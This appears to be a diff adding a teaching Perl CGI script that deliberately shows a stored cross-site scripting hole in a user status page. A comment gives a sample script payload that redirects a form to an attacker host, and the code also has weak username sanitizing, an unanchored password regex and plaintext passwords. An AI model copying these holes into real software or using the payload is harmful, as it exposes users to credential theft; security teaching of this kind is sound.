@@ -1,0 +1,73 @@
+#!/usr/bin/perl
+# Simple CGI script written by andrewt@cse.unsw.edu.au
+# to exhibit a cross site scripting attack
+
+# The code below allows a user to upload a string describing
+# their status.  This string is then included in a web page viewed by other users
+# which is a security hole because it allows cross-site scripting attack .
+
+# A use can upload HTML and then it will be embedded in a web page
+# viewed by other users.
+
+# This is a security hole, because they can for example,
+# upload javascript which changes the page, for example, redirecting URLs
+# For example if they could upload this Javascript:
+# <script>window.onload = function () {document.getElementsByTagName("form")[0].action = "http://hackers.r.us/hack.cgi";};</script>
+
+use CGI qw/:all/;
+use CGI::Carp qw(fatalsToBrowser warningsToBrowser);
+
+print header, start_html('My Status'), h2('Status Summary');
+warningsToBrowser(1);
+
+$data_directory = "./status_data/";
+-d $data_directory or mkdir $data_directory or die "Cannot create $data_directory: $!\n";
+
+if (param('new_status')) {
+    my $user = param('user');
+    
+    # sanitize supplied user name
+    $user =~ s/\W//;
+    $user =~ substr($user, 0, 128);
+    
+    # retrieve correct password from file "status_passwords"
+    my $correct_password;
+    open P, '<', "status_passwords" or die;
+    while (<P>) {
+        last if ($correct_password) = /$user:(.*)$/;
+    }
+    
+    # if supplied password is correct update users's status 
+    
+    if (defined $correct_password && $correct_password eq param('password')) {
+        open S, '>', "$data_directory/$user" or die;
+        print S param('new_status');
+        close S;
+        print "Status for $user updated\n",p;
+    } else {
+        print "Error: could not update status for $user\n",p;
+    }
+}
+
+
+
+# display the status of all users
+foreach $status_file (glob "$data_directory/*") {
+    my ($user) = $status_file =~ /\/([^\/]*)$/;
+    open F, '<', $status_file or next;
+    my $user_status = join '', <F>;
+    print "<li> $user: $user_status\n";
+}
+
+# allow users to update their status
+
+print   hr,
+        start_form,
+        p, 'Username: ', textfield('user'), 
+        p, 'Password: ', textfield('password'),
+        p, 'New status: ', textfield('new_status'),
+        p, submit('Update status'),
+        end_form,
+        end_html;
+exit 0;
+
